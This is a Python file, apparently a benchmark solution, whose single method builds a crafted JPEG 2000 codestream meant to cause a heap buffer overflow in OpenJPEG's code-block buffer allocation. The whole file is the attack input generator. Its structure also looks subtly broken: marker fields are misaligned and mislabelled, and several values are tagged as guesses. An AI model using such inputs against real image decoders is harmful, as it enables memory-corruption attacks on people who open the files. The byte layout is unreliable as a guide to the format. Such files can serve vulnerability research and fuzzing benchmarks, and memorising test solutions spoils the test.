class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal JPEG 2000 codestream attempting to trigger heap buffer overflow via large parameters
        # This is a crafted PoC based on vulnerability in opj_t1_allocate_buffers
        # Ground-truth length: 1479 bytes
        poc = bytearray(1479)
        
        # JPEG 2000 Codestream start: SOC marker
        poc[0:2] = b'\xff\x90'
        
        # SIZ marker (0xFF51)
        poc[2:4] = b'\xff\x51'
        # Length of SIZ segment (example: 47 bytes for basic setup)
        poc[4:6] = (47).to_bytes(2, 'big')
        # Capabilities (example)
        poc[6] = 0x08  # Isot, prof
        # Image size large to influence allocations
        poc[7:11] = (10000).to_bytes(4, 'big')  # Xsiz
        poc[11:15] = (10000).to_bytes(4, 'big')  # Ysiz
        poc[15:19] = (0).to_bytes(4, 'big')  # X0siz
        poc[19:23] = (0).to_bytes(4, 'big')  # Y0siz
        # Tile size large
        poc[23:27] = (8192).to_bytes(4, 'big')  # XTsiz
        poc[27:31] = (8192).to_bytes(4, 'big')  # YTsiz
        poc[31:35] = (0).to_bytes(4, 'big')  # X0Tsiz
        poc[35:39] = (0).to_bytes(4, 'big')  # Y0Tsiz
        # CS and layers
        poc[39] = 0x07  # Irrelevant
        poc[40] = 1     # Layers
        # Multiple components for complexity
        poc[41] = 3     # Number of components
        for i in range(3):
            offset = 42 + i * 3
            poc[offset] = 0x01  # Depth
            poc[offset+1] = 0x01  # Sgnd
            poc[offset+2] = 0x00  # Prec
        
        # COD marker (0xFF52) with settings to trigger HT_DEC and large codeblocks
        cod_offset = 51
        poc[cod_offset:cod_offset+2] = b'\xff\x52'
        cod_len = 17  # Example length
        poc[cod_offset+2:cod_offset+4] = cod_len.to_bytes(2, 'big')
        poc[cod_offset+4] = 0x07  # Progression: RPCL, layers=1, levels=5 (many res levels for buffer sizing)
        poc[cod_offset+5] = 0x01  # Multiple comp
        # Codeblock style: large CB, HT mode? For HT_DEC, set COC for HT
        poc[cod_offset+6:cod_offset+10] = (64).to_bytes(4, 'big')  # Precincts example
        poc[cod_offset+10:cod_offset+12] = (0x000f).to_bytes(2, 'big')  # CB style: large 64x64, lazy, etc.
        poc[cod_offset+12:cod_offset+14] = (2).to_bytes(2, 'big')  # QCD: no quant
        poc[cod_offset+14:cod_offset+16] = (0x00).to_bytes(2, 'big')  # RGN example
        poc[cod_offset+16] = 0x00
        
        # Add more segments to pad and potentially overflow calculations
        # QCC for components to set HT? But HT is for part2, need to set Scod to HT
        # For simplicity, set in COC or assume
        # Pad the rest with invalid or repeating data to reach length and cause overflow on decode
        for i in range(51 + cod_len, 1479):
            poc[i] = 0xFF if i % 2 == 0 else 0x00
        
        # EOC marker at end
        poc[-2:] = b'\xff\xd9'
        
        return bytes(poc)